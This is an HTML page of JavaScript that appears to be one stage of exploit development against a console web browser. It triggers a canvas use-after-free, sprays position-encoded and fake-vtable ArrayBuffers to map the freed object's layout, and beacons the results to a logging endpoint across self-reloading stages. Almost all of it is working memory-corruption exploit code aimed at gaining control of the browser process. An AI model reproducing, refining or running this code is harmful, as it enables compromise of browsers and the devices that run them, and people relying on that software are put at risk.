<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1159 - Position-Encoded Reclaim Oracle</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
h2{color:#00ff88;font-size:14px;margin:6px 0}
#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<h2>P1159 Position-Encoded Reclaim Oracle</h2>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),T0=Date.now();
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1159-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu;
try{_bu=new BigUint64Array(_b8);}catch(e){}
function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
return '0x'+v.toString(16);}

/* ═══════════════════════════════════════════════════════════════════════
   P1159: POSITION-ENCODED spray discriminates WHERE lineWidth reads from.

   P1158 result: all 16 forge stages crashed even with MAPPED targets
   (FL-leaked p1/p2). Two hypotheses: (a) AB(768) never reclaims the freed
   context slot on our console; (b) it reclaims but our build's
   m_stateStack header is NOT at +112, so the zeroed AB leaves the REAL
   m_buffer = 0 -> read at 0+48 -> SIGSEGV either way.

   Position-encoded spray resolves both: fill EVERY qword k of the AB with
   the double value k*0.0001. If lineWidth (or miterLimit/globalAlpha/
   shadowBlur) survives the read, the returned value directly encodes the
   byte offset of the field being read: offset = value * 80000.

   Stages (crash-resume, one per boot):
   0: same-type control — 200x Canvas2D spray, read lineWidth (expect 1.0)
   1: AB(768) pos-encoded
   2: AB(768) uniform 9999.99 (v527 replication)
   3: AB(800) pos-encoded
   4: AB(832) pos-encoded
   5: AB(896) pos-encoded
   6: AB(768) pos-encoded + vtable slot (+0..7) = p1-like heap ptr 0x10007ee450
      (if dispatch is virtual, this changes crash behavior vs stage 1)
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=[
  {kind:'sametype',sz:768},
  {kind:'posenc',sz:768},
  {kind:'uniform',sz:768},
  {kind:'posenc',sz:800},
  {kind:'posenc',sz:832},
  {kind:'posenc',sz:896},
  {kind:'posenc_vt',sz:768}
];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1159_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1159_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];

B('BOOT','stage='+stage+'/'+STAGES.length+'|res='+JSON.stringify(results).slice(0,400));
if(stage>=STAGES.length){
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL STAGES DONE ===','ok');
  try{localStorage.removeItem('p1159_stage');}catch(e){}
}else{

try{localStorage.setItem('p1159_stage',''+(stage+1));}catch(e){}
var conf=STAGES[stage];
B('STAGE','n='+stage+'|kind='+conf.kind+'|sz='+conf.sz);

/* UAF trigger: BMR outer + 2d inner */
var canvas=document.createElement('canvas');
canvas.width=1;canvas.height=1;
var innerCtx=null;
var uafOpts={};
Object.defineProperty(uafOpts,'alpha',{get:function(){
  innerCtx=canvas.getContext('2d');return true;}});
canvas.getContext('bitmaprenderer',uafOpts);
B('UAF','inner='+(innerCtx?'OK':'NULL'));

if(!innerCtx){
  B('FAIL','no-inner');setTimeout(function(){location.reload(true);},1500);
}else if(conf.kind==='sametype'){
  /* Same-type control: 200 Canvas2D contexts reclaim the freed slot
     (our P605v2: spray[7] position). Stale wrapper reads live object. */
  var sprays=[];
  for(var i=0;i<200;i++){
    var cv=document.createElement('canvas');cv.width=1;cv.height=1;
    sprays.push(cv.getContext('2d'));
  }
  B('ST-SPRAY','n=200');
  var stlw;
  try{stlw=innerCtx.lineWidth;}catch(e){stlw='ERR:'+e.message.slice(0,20);}
  B('ST-READ','lw='+stlw);
  results.push({stage:stage,kind:'sametype',lw:String(stlw)});
  try{localStorage.setItem('p1159_res',JSON.stringify(results));}catch(e){}
  innerCtx=null;sprays=null;
  B('NEXT');setTimeout(function(){location.reload(true);},1000);
}else{
  /* flush dealloc log (V650 technique) */
  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}

  /* spray with the chosen pattern */
  var dvs=[];
  for(var s=0;s<200;s++){
    var ab=new ArrayBuffer(conf.sz);
    var dv=new DataView(ab);
    var kind=conf.kind;
    if(kind==='uniform'){
      for(var o=0;o+7<conf.sz;o+=8)dv.setFloat64(o,9999.99,true);
    }else{
      /* pos-encoded: qword k = k*0.0001 */
      for(var o=0,k=0;o+7<conf.sz;o+=8,k++){
        dv.setFloat64(o,k*0.0001,true);
      }
      if(kind==='posenc_vt'){
        /* overwrite qword 0 (vtable slot) with a real-looking heap ptr */
        dv.setUint32(0,0x7ee450,true);
        dv.setUint32(4,0x1000,true);
      }
    }
    dvs.push(dv);
  }
  B('SPRAY','kind='+conf.kind+'|sz='+conf.sz+'|n=200');

  /* CRITICAL READS */
  var lw,ml=-1,ga=-1,sb=-1;
  try{lw=innerCtx.lineWidth;}catch(e){lw='ERR:'+e.message.slice(0,16);}
  try{ml=innerCtx.miterLimit;}catch(e){ml='ERR';}
  try{ga=innerCtx.globalAlpha;}catch(e){ga='ERR';}
  try{sb=innerCtx.shadowBlur;}catch(e){sb='ERR';}

  var lwStr=String(lw);
  if(typeof lw==='number'){
    var offEst=Math.round(lw*80000);
    B('READ','lw='+lw+'|offEst='+offEst+'|ml='+ml+'|ga='+ga+'|sb='+sb);
    log('*** READ: lw='+lw+' -> source offset ~'+offEst+' (sz='+conf.sz+') ***','hit');
  }else{
    B('READ','lw='+lwStr+'|ml='+ml+'|ga='+ga+'|sb='+sb);
    log('READ: '+lwStr,'err');
  }
  results.push({stage:stage,kind:conf.kind,sz:conf.sz,lw:lwStr,
    ml:String(ml),ga:String(ga),sb:String(sb)});
  try{localStorage.setItem('p1159_res',JSON.stringify(results));}catch(e){}

  innerCtx=null;dvs=null;
  B('NEXT');setTimeout(function(){location.reload(true);},1000);
}

} /* end stage machine */

/* auto-reload checker */
(function(){
  var cur='P1159-posenc-oracle';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
